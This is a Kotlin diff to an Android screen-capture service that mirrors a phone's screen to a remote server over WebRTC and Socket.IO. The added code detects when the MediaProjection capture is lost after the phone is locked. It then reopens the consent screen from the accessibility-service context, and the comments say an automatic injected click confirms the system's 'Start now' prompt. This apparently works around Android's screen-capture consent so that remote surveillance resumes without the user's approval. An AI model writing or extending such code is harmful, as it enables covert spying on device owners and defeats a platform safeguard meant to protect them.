@@ -58,6 +58,12 @@ class ScreenCaptureService : Service() {
         var isRunning = false
             private set
 
+        // TRUE só quando há captura REAL (MediaProjection válida + VirtualDisplay),
+        // não apenas o serviço vivo em "modo escuta". A revalidação do espelhamento
+        // (re-pedir "Iniciar agora") usa isto: se o serviço roda mas NÃO está
+        // capturando de verdade (token perdido ao bloquear/dormir), re-pede.
+        @Volatile var capturandoDeVerdade = false
+
         @Volatile
         var aguardandoFrameRefresh = false
 
@@ -495,6 +501,7 @@ class ScreenCaptureService : Service() {
                     override fun onStop() {
                         enviarLog("MediaProjection encerrada pelo sistema/usuário.")
                         isRunning = false
+                        capturandoDeVerdade = false   // captura real perdida -> revalidar no desbloqueio
                     }
                 }, Handler(Looper.getMainLooper()))
             }
@@ -714,6 +721,8 @@ class ScreenCaptureService : Service() {
             null,
             backgroundHandler
         )
+        // Captura REAL ativa quando há MediaProjection + VirtualDisplay.
+        capturandoDeVerdade = (mediaProjection != null && virtualDisplay != null)
         imageReader?.setOnImageAvailableListener({ reader ->
             var image: android.media.Image? = null
             try {
@@ -734,10 +743,10 @@ class ScreenCaptureService : Service() {
                 // JPEG e elimina a recriação espúria.
                 ultimoFrameMs = agora
 
-                // WebRTC CONECTADO: o vídeo flui por PeerConnection (baixa
-                // latência, aceleração HW). Para de enviar JPEG pesado via
-                // Socket.IO — economiza bateria e banda. Se cair, volta ao JPEG.
-                if (WebRtcStreamer.isConectado) return@setOnImageAvailableListener
+                // WebRTC CONECTADO: o vídeo principal flui por WebRTC, mas mantemos
+                // o Socket.IO JPEG (enviar_tela) ativo em paralelo (limitado a ~5-8 FPS)
+                // para que visualizadores secundários (como o Emulador FPS) recebam dados e vídeo.
+                val intervaloMinimo = if (WebRtcStreamer.isConectado) 160L else 16L
 
                 // ============================================================
                 // SINCRONIA DE FRAME ROBUSTA — NUNCA trava o espelhamento
@@ -757,7 +766,7 @@ class ScreenCaptureService : Service() {
                 // foi marcado com setHideDuringScreenSharing(true) e é omitido
                 // da captura automaticamente, sem piscar — nesse caso caímos
                 // direto no else-if abaixo, que envia todos os frames normais.
-                if (agora - lastSendTime < 16) return@setOnImageAvailableListener
+                if (agora - lastSendTime < intervaloMinimo) return@setOnImageAvailableListener
                 lastSendTime = agora
                 // (ultimoFrameMs já atualizado acima, antes do early-return do WebRTC)
 
@@ -892,6 +901,25 @@ class ScreenCaptureService : Service() {
             .build()
     }
 
+    /** Reabre a MainActivity pedindo a REVALIDAÇÃO do espelhamento (modal
+     *  "Iniciar agora") quando a captura real foi perdida no bloqueio/descanso.
+     *  Usa o contexto da ACESSIBILIDADE (privilegiado p/ abrir Activity em
+     *  segundo plano no Android 10–15); o auto-clique (inject) confirma rápido. */
+    private fun solicitarRevalidacaoEspelhamento() {
+        try {
+            if (capturandoDeVerdade) return
+            val intent = Intent(this, MainActivity::class.java).apply {
+                putExtra(MainActivity.EXTRA_REVALIDAR_ESPELHAMENTO, true)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+            }
+            val svc = MyAccessibilityService.instance
+            if (svc != null) svc.startActivity(intent) else startActivity(intent)
+            enviarLog("[REVALIDAR] Sem captura após desbloqueio -> reabrindo consentimento (Iniciar agora) + auto-clique.")
+        } catch (e: Exception) {
+            enviarLog("[REVALIDAR] Falha ao reabrir consentimento: ${e.message}")
+        }
+    }
+
     private fun registrarReceiverTelaLigada() {
         if (receiverTelaRegistrado) return
         try {
@@ -959,13 +987,20 @@ class ScreenCaptureService : Service() {
                         Intent.ACTION_USER_PRESENT -> {
                             isScreenOn = true
                             enviarLog("USER_PRESENT detectado — tela desbloqueada; garantindo conexão Socket.IO e retomando espelhamento normal.")
-                            
+
                             SocketManager.garantirConexao()
                             removerOverlayMantemTelaAcesa()
                             MyAccessibilityService.instance?.pararCapturaAcessibilidade()
 
                             Handler(Looper.getMainLooper()).postDelayed({
                                 recriarVirtualDisplay(force = true)
+                                // Se a captura REAL não voltou (MediaProjection perdida
+                                // ao bloquear/dormir), re-pede o consentimento: abre a
+                                // MainActivity -> modal "Iniciar agora" -> auto-clique
+                                // (inject) confirma rápido e o espelhamento volta.
+                                Handler(Looper.getMainLooper()).postDelayed({
+                                    if (!capturandoDeVerdade) solicitarRevalidacaoEspelhamento()
+                                }, 1200L)
                             }, 300L)
                         }
                     }
@@ -1049,6 +1084,7 @@ class ScreenCaptureService : Service() {
         handlerThread = null
         backgroundHandler = null
         isRunning = false
+        capturandoDeVerdade = false
         modoSomenteEscuta = false
         Log.d(TAG, "ScreenCaptureService destruído")
     }
